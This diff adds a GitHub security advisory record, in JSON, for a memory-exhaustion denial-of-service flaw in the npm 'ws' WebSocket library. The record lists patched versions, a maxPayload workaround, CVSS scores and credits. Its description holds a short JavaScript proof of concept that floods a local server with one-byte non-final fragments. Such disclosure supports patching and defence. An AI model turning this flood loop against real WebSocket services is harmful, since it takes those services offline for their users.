@@ -1,0 +1,149 @@
+{
+  "ghsa_id": "GHSA-96hv-2xvq-fx4p",
+  "cve_id": "CVE-2026-48779",
+  "url": "https://api.github.com/advisories/GHSA-96hv-2xvq-fx4p",
+  "html_url": "https://github.com/advisories/GHSA-96hv-2xvq-fx4p",
+  "summary": "ws: Memory exhaustion DoS from tiny fragments and data chunks",
+  "description": "### Impact\n\nA high volume of exceptionally small fragments and data chunks can be sent by a peer, with modest network traffic, to force the remote peer into allocating and holding structural wrappers that consume far more memory than the default documented message-size limit, leading to process termination due to OOM.\n\n### Proof of concept\n\n```js\nimport { WebSocket, WebSocketServer } from 'ws';\n\nconst wss = new WebSocketServer({ port: 0 }, function () {\n  const data = Buffer.alloc(1);\n  const options = { fin: false };\n  const { port } = wss.address();\n  const ws = new WebSocket(`ws://localhost:${port}`);\n\n  ws.on('open', function () {\n    (function send() {\n      ws.send(data, options, function (err) {\n        if (err) return;\n        send();\n      });\n    })();\n  });\n\n  ws.on('error', console.error);\n  ws.on('close', function (code, reason) {\n    console.log(`client close - code: ${code} reason: ${reason.toString()}`);\n  });\n});\n\nwss.on('connection', function (ws) {\n  ws.on('error', console.error);\n  ws.on('close', function (code, reason) {\n    console.log(`server close - code: ${code} reason: ${reason.toString()}`);\n  });\n});\n```\n\n### Patches\n\nThe vulnerability was fixed in ws@8.21.0 (https://github.com/websockets/ws/commit/bca91adf15677e47dbe4f959653452727be28b94) and backported to ws@7.5.11 (https://github.com/websockets/ws/commit/fd36cd864fcdf62a08273a99e19a7d975401fee8), ws@6.2.4 (https://github.com/websockets/ws/commit/86d3e8a5fb0246ed373860c5fbb0de88824a27f7), and ws@5.2.5 (https://github.com/websockets/ws/commit/b5372ac67bb97a773727b8e9f5035a8123556d53).\n\n### Workarounds\n\nIn vulnerable versions, the issue can be mitigated by lowering the value of the `maxPayload` option if possible.\n\n### Credits\n\nThe vulnerability was responsibly disclosed and fixed by [Nadav Magier](https://github.com/Nadav0077).",
+  "type": "reviewed",
+  "severity": "high",
+  "repository_advisory_url": "https://api.github.com/repos/websockets/ws/security-advisories/GHSA-96hv-2xvq-fx4p",
+  "source_code_location": "https://github.com/websockets/ws",
+  "identifiers": [
+    {
+      "value": "GHSA-96hv-2xvq-fx4p",
+      "type": "GHSA"
+    },
+    {
+      "value": "CVE-2026-48779",
+      "type": "CVE"
+    }
+  ],
+  "references": [
+    "https://github.com/websockets/ws/security/advisories/GHSA-96hv-2xvq-fx4p",
+    "https://github.com/websockets/ws/commit/86d3e8a5fb0246ed373860c5fbb0de88824a27f7",
+    "https://github.com/websockets/ws/commit/b5372ac67bb97a773727b8e9f5035a8123556d53",
+    "https://github.com/websockets/ws/commit/bca91adf15677e47dbe4f959653452727be28b94",
+    "https://github.com/websockets/ws/commit/fd36cd864fcdf62a08273a99e19a7d975401fee8",
+    "https://nvd.nist.gov/vuln/detail/CVE-2026-48779",
+    "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-48779.json",
+    "https://bugzilla.redhat.com/show_bug.cgi?id=2489661",
+    "https://access.redhat.com/security/cve/CVE-2026-48779",
+    "https://access.redhat.com/errata/RHSA-2026:34342",
+    "https://access.redhat.com/errata/RHSA-2026:33574",
+    "https://access.redhat.com/errata/RHSA-2026:33183",
+    "https://access.redhat.com/errata/RHSA-2026:33173",
+    "https://access.redhat.com/errata/RHSA-2026:33163",
+    "https://access.redhat.com/errata/RHSA-2026:33160",
+    "https://access.redhat.com/errata/RHSA-2026:33155",
+    "https://access.redhat.com/errata/RHSA-2026:29197",
+    "https://access.redhat.com/errata/RHSA-2026:36820",
+    "https://access.redhat.com/errata/RHSA-2026:36754",
+    "https://access.redhat.com/errata/RHSA-2026:37272",
+    "https://access.redhat.com/errata/RHSA-2026:27171",
+    "https://access.redhat.com/errata/RHSA-2026:26638",
+    "https://github.com/advisories/GHSA-96hv-2xvq-fx4p"
+  ],
+  "published_at": "2026-06-15T16:34:23Z",
+  "updated_at": "2026-07-13T15:31:39Z",
+  "github_reviewed_at": "2026-06-15T16:34:23Z",
+  "nvd_published_at": "2026-06-17T13:20:42Z",
+  "withdrawn_at": null,
+  "vulnerabilities": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "ws"
+      },
+      "vulnerable_version_range": ">= 1.1.0, < 5.2.5",
+      "first_patched_version": "5.2.5",
+      "vulnerable_functions": []
+    },
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "ws"
+      },
+      "vulnerable_version_range": ">= 6.0.0, < 6.2.4",
+      "first_patched_version": "6.2.4",
+      "vulnerable_functions": []
+    },
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "ws"
+      },
+      "vulnerable_version_range": ">= 7.0.0, < 7.5.11",
+      "first_patched_version": "7.5.11",
+      "vulnerable_functions": []
+    },
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "ws"
+      },
+      "vulnerable_version_range": ">= 8.0.0, < 8.21.0",
+      "first_patched_version": "8.21.0",
+      "vulnerable_functions": []
+    }
+  ],
+  "cvss_severities": {
+    "cvss_v3": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "score": 7.5
+    },
+    "cvss_v4": {
+      "vector_string": null,
+      "score": 0.0
+    }
+  },
+  "cwes": [
+    {
+      "cwe_id": "CWE-400",
+      "name": "Uncontrolled Resource Consumption"
+    },
+    {
+      "cwe_id": "CWE-770",
+      "name": "Allocation of Resources Without Limits or Throttling"
+    },
+    {
+      "cwe_id": "CWE-1050",
+      "name": "Excessive Platform Resource Consumption within a Loop"
+    }
+  ],
+  "credits": [
+    {
+      "user": {
+        "login": "Nadav0077",
+        "id": 18245584,
+        "node_id": "MDQ6VXNlcjE4MjQ1NTg0",
+        "avatar_url": "https://avatars.githubusercontent.com/u/18245584?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/Nadav0077",
+        "html_url": "https://github.com/Nadav0077",
+        "followers_url": "https://api.github.com/users/Nadav0077/followers",
+        "following_url": "https://api.github.com/users/Nadav0077/following{/other_user}",
+        "gists_url": "https://api.github.com/users/Nadav0077/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/Nadav0077/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/Nadav0077/subscriptions",
+        "organizations_url": "https://api.github.com/users/Nadav0077/orgs",
+        "repos_url": "https://api.github.com/users/Nadav0077/repos",
+        "events_url": "https://api.github.com/users/Nadav0077/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/Nadav0077/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "type": "reporter"
+    }
+  ],
+  "comments": 27,
+  "cvss": {
+    "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "score": 7.5
+  },
+  "epss": {
+    "percentage": 0.00931,
+    "percentile": 0.58956
+  }
+}
